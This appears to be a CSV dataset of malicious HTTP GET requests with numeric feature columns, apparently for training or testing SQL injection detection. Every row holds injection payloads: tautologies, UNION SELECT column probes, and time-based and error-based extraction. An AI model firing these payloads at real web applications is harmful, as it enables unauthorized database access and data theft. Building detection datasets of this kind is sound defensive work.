78,2,200,2262,14,33,14,1,1,GET ?name= ORDER BY 9 &tel= and (select substring(@@version_2_1))='y' HTTP/1.1
54,2,200,1111,14,15,8,1,1,GET ?account= ORDER BY 30-- &pass=" or "a"="a HTTP/1.1
51,2,200,1985,7,21,9,1,1,GET ?name=" or sleep(5)#&tel=admin" or 1=1 HTTP/1.1
159,2,200,1216,60,4,18,1,1,GET ?id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))-- &id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20 HTTP/1.1
75,2,200,5045,21,12,8,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11#&pass=" -- HTTP/1.1
73,3,200,7386,30,7,19,1,1,GET ?phone='&'&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5# HTTP/1.1
56,2,200,5929,22,7,10,1,1,GET ?name= AND 1=0#&tel= ORDER BY 1_SLEEP(5)_3# HTTP/1.1
133,2,200,6097,30,11,16,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24&pass=" or ""-" HTTP/1.1
52,4,200,2149,19,8,11,1,1,GET ?mail=&&SLEEP(5)#&pass= ORDER BY 31337# HTTP/1.1
85,2,200,1438,32,14,19,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6-- &id=Time-Based: HTTP/1.1
181,2,200,1796,84,8,32,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))-- &pass= UNION ALL SELECT 1_2_3_4_5--  HTTP/1.1
111,2,200,4514,21,9,7,1,1,GET ?name=" or 0=0 #&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
182,2,200,4059,73,7,24,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22#&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_4 HTTP/1.1
91,2,200,6730,29,9,7,1,1,GET ?email= WHERE 1=1 AND 1=0&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13 HTTP/1.1
227,2,200,1647,60,10,18,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17# HTTP/1.1
71,2,200,6323,19,19,17,1,1,GET ?tel= ORDER BY SLEEP(5)-- &name=");waitfor delay '0:0:5'-- HTTP/1.1
107,2,200,6294,21,11,9,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21&id=admin' or 1=1-- HTTP/1.1
122,2,200,6917,46,8,24,1,1,GET ?id=') or '1'='1&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12# HTTP/1.1
97,2,200,6159,31,11,22,1,1,GET ?name=') or ('1'='1'#&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7 HTTP/1.1
79,2,200,6296,21,14,15,1,1,GET ?username=' or '1'='1'--&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8--  HTTP/1.1
42,2,200,1785,12,11,12,1,1,GET ?email=SLEEP(5)='&pass='="or' HTTP/1.1
94,2,200,3632,31,16,16,1,1,GET ?name=" or sleep(5)#&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6 HTTP/1.1
279,2,200,1982,110,29,54,1,1,GET ?code=' group by password having 1=1--&code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))--  HTTP/1.1
183,2,200,4576,75,6,21,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20-- &pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL--  HTTP/1.1
96,2,200,5663,31,21,21,1,1,GET ?tel=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--&name=" or benchmark(10000000_MD5(1))# HTTP/1.1
107,1,200,5283,30,5,14,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
107,1,200,5820,30,5,14,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
69,2,200,1617,30,11,18,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'&phone='="or' HTTP/1.1
127,1,200,7969,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
127,1,200,7614,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
127,1,200,6420,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
160,2,200,6610,77,7,30,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88)))&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8 HTTP/1.1
186,2,200,5692,81,16,33,1,1,GET ?email= OR 3409=3409 AND ('pytW' LIKE 'pytW&phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120))) HTTP/1.1
48,2,200,5063,14,13,9,1,1,GET ?email= ORDER BY 30#&pass= like '%' HTTP/1.1
301,2,200,6748,149,10,27,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
299,2,200,7229,85,6,31,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
187,2,200,5660,69,11,28,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
57,2,200,2754,7,18,11,1,1,GET ?mail=1′) and '1′='1–&pass=admin") or "1"="1 HTTP/1.1
48,2,200,5217,7,15,12,2,1,GET ?id=") or pg_sleep(5)--&id=or 1=1/* HTTP/1.1
49,1,200,7287,13,4,7,1,1,GET ?pass= AND 7506=9091 AND ('5913=5913 HTTP/1.1
49,1,200,5966,13,4,7,1,1,GET ?pass= AND 7506=9091 AND ('5913=5913 HTTP/1.1
129,2,200,3490,31,14,22,2,1,GET ?phone=admin') or ('1'='1'/*&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
127,2,200,3750,28,4,6,1,1,GET ?id= ORDER BY 29# &id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
113,2,200,2915,31,26,11,1,1,GET ?mail=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055&pass= ORDER BY 22#  HTTP/1.1
160,2,200,7457,81,18,26,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass=admin' or '1'='1'# HTTP/1.1
186,2,200,7087,89,12,33,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88)))-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9# HTTP/1.1
235,2,200,4621,99,11,47,1,1,GET ?name= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))&tel='or 1=1 or ''=' HTTP/1.1
93,2,200,1748,13,31,18,1,1,GET ?name= AND 7506=9091 AND ('5913=5913&phone=_(select * from (select(sleep(10)))a) HTTP/1.1
33,1,200,6628,7,10,6,1,1,GET ?password=' or 0=0 # HTTP/1.1
74,2,200,1482,9,28,17,1,1,GET ?email=or benchmark(50000000_MD5(1))--&phone=') or sleep(5)=' HTTP/1.1
252,2,200,2937,110,10,50,1,1,GET ?phone= and 1=1&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))# HTTP/1.1
51,2,200,4313,7,14,16,1,1,GET ?email= or 0=0 #&phone=') or ('1'='1-- HTTP/1.1
51,2,200,7676,7,18,13,1,1,GET ?id=') or sleep(5)='&id=admin" or 1=1# HTTP/1.1
127,2,200,3110,48,18,23,1,1,GET ?name=benchmark(50000000_MD5(1))--&phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7 HTTP/1.1
43,2,200,6029,13,8,8,1,1,GET ?id= HAVING 1=0#&pass= or 1=1– HTTP/1.1
239,2,200,7504,156,10,19,1,1,GET ?email= ORDER BY 27 &phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
96,2,200,1588,21,9,7,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&id=" or ""^" HTTP/1.1
207,2,200,2420,73,9,26,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) HTTP/1.1
47,2,200,1741,7,13,14,1,1,GET ?code=') or '1'='1'#&code= and 1=1 HTTP/1.1
52,2,200,7255,9,17,10,1,1,GET ?mail= OR x=y&pass=admin") or "1"="1"-- HTTP/1.1
95,2,200,5848,30,21,26,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2-- &phone="));waitfor delay '0:0:5'-- HTTP/1.1
35,2,200,5986,9,8,7,1,1,GET ?mail="*"&pass= OR 1=0 HTTP/1.1
147,2,200,3867,31,14,16,1,1,GET ?name=admin") or ("1"="1&tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
149,2,200,1510,35,9,7,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14#&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
163,2,200,1669,76,8,26,1,1,GET ?code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))#&code= UNION ALL SELECT 1_2_3_4_5_6_7_8# HTTP/1.1
121,2,200,1429,30,9,18,1,1,GET ?name="-"&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
87,2,200,3607,7,53,13,1,1,GET ?name=admin') or '1'='1&phone=select current server from sysibm.sysdummy1; HTTP/1.1
113,2,200,2793,31,15,17,1,1,GET ?name=or true--&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
109,2,200,6085,28,7,7,1,1,GET ?phone= ORDER BY 2-- &id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
37,1,200,5706,7,6,6,1,1,GET ?pass=' or         0=0 # HTTP/1.1
37,1,200,2697,7,6,6,1,1,GET ?pass=' or         0=0 # HTTP/1.1
104,2,200,1995,26,11,9,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19#&pass=pg_SLEEP(5)# HTTP/1.1
121,2,200,5681,21,14,8,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25&name=" or sleep(5)# HTTP/1.1
160,2,200,1978,30,14,19,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&id=admin") or "1"="1"-- HTTP/1.1
125,2,200,5644,30,16,19,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19-- &pass=admin' or 1=1 HTTP/1.1
41,2,200,3571,7,12,11,1,1,GET ?id=' or 1=1#&id=' or true-- HTTP/1.1
126,1,200,1720,73,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
126,1,200,7680,73,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
150,2,200,3373,33,14,14,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27&pass= OR x=y HTTP/1.1
130,2,200,7103,31,20,24,1,1,GET ?code="));waitfor delay '0:0:5'--&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
156,2,200,5398,92,7,19,1,1,GET ?name= ORDER BY 28 &tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
118,2,200,7118,65,6,20,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL-- &pass== HTTP/1.1
56,2,200,3962,7,19,18,1,1,GET ?id=" or pg_sleep(5)--&pass=') or ('x')=('x HTTP/1.1
122,2,200,1970,31,15,15,2,1,GET ?email=admin'/*&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18 HTTP/1.1
105,2,200,1317,46,16,18,1,1,GET ?account=admin" #&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5 HTTP/1.1
56,2,200,5748,28,6,6,1,1,GET ?id= ORDER BY 11 &pass= UNION ALL SELECT 1# HTTP/1.1
111,2,200,4809,45,16,26,1,1,GET ?email=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe&pass=%' AND 8310=8310 AND '%'=' HTTP/1.1
155,2,200,3343,33,7,15,1,1,GET ?tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30#&name= OR 1=1 HTTP/1.1
128,2,200,5153,61,7,25,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88)))#&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8--  HTTP/1.1
257,2,200,2639,141,12,27,1,1,GET ?username= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12 HTTP/1.1
265,2,200,3285,125,10,29,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
55,2,200,1333,7,17,13,1,1,GET ?code= or 1=1--&code=admin") or ("1"="1"-- HTTP/1.1
113,2,200,1847,46,16,21,1,1,GET ?email=admin" or 1=1--&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6# HTTP/1.1
125,2,200,1085,31,25,19,1,1,GET ?id=' group by userid having 1=1--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
162,2,200,2601,56,29,21,2,1,GET ?account=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2))))&pass=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
67,2,200,3149,12,19,18,1,1,GET ?id=or SLEEP(5)="&id=') or ('a'='a and hi") or ("a"="a HTTP/1.1
118,2,200,1864,38,11,16,1,1,GET ?account= ORDER BY 9-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
149,2,200,1667,59,9,26,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14&phone=' AND MID(VERSION()_1_1) = '5'; HTTP/1.1
136,2,200,3167,30,15,22,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22#&pass=admin'or 1=1 or ''=' HTTP/1.1
154,2,200,1931,31,11,17,1,1,GET ?code=1′) and '1′='1–&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
119,2,200,2097,31,16,21,1,1,GET ?tel=1)) or pg_sleep(5)--&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
101,2,200,2477,9,54,14,1,1,GET ?email=select system_user from sysibm.sysdummy1;&pass=")) or benchmark(10000000_MD5(1))# HTTP/1.1
173,2,200,7571,53,6,17,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29&pass= ORDER BY 22  HTTP/1.1
178,2,200,2432,60,11,19,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
109,2,200,3603,38,12,17,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11-- &pass=AnD SLEEP(5) HTTP/1.1
145,2,200,3473,60,7,20,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7#&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12--  HTTP/1.1
179,2,200,4337,74,16,35,1,1,GET ?email=admin") or ("1"="1"#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))# HTTP/1.1
82,3,200,7741,31,9,15,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5#&phone="&" HTTP/1.1
119,2,200,1462,35,9,21,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18-- &pass=SLEEP(5)-- HTTP/1.1
55,2,200,7192,7,22,14,1,1,GET ?email=);waitfor delay '0:0:5'--&phone=" # HTTP/1.1
181,2,200,2611,53,9,20,1,1,GET ?email= ORDER BY 5-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30# HTTP/1.1
388,2,200,5144,181,9,77,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69)))&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))--  HTTP/1.1
53,2,200,2100,14,14,9,1,1,GET ?id=admin" or "1"="1"#&pass=AnD SLEEP(5) HTTP/1.1
74,2,200,5210,13,17,14,1,1,GET ?code=")) or pg_sleep(5)--&code= AND 1083=1083 AND (1427=1427 HTTP/1.1
95,2,200,1216,39,8,17,1,1,GET ?mail= WHERE 1=1 AND 1=0--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4 HTTP/1.1
98,2,200,3098,31,10,15,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11#&code=or 1=1 HTTP/1.1
152,2,200,1371,65,10,26,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))#&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
107,2,200,4292,57,9,22,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_4&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2# HTTP/1.1
254,2,200,3398,149,11,29,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6-- &pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
132,2,200,5632,46,14,22,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14&pass=' or '1'='1 HTTP/1.1
147,2,200,3460,38,12,13,1,1,GET ?username= ORDER BY 12 &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
63,2,200,6374,9,21,10,1,1,GET ?email=benchmark(50000000_MD5(1))#&phone=" or "" " HTTP/1.1
98,2,200,7338,21,16,15,1,1,GET ?id=');waitfor delay '0:0:5'--&id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
119,2,200,6947,30,14,22,1,1,GET ?phone=admin") or ("1"="1"--&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
176,2,200,2765,80,10,29,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13&phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL--  HTTP/1.1
130,2,200,6794,52,10,26,1,1,GET ?phone=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
100,2,200,4600,49,8,14,1,1,GET ?mail= UNION ALL SELECT NULL#&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
158,2,200,7269,45,7,17,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16-- &tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
57,2,200,4343,19,16,10,1,1,GET ?email=ORDER BY SLEEP(5)&pass=" or sleep(5)# HTTP/1.1
